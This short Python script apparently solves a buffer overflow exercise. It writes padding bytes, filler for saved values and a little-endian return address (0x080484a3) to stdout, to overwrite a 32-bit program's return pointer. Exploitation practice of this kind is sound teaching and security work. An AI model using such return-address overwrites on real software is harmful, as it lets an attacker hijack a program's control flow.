import sys
from struct import pack

ret_addr = 0x080484a3

output = b"A" * 10
output += b"BBBB"
output += b"CCCC"
output += pack("<I", ret_addr)

sys.stdout.buffer.write(output + b"\n")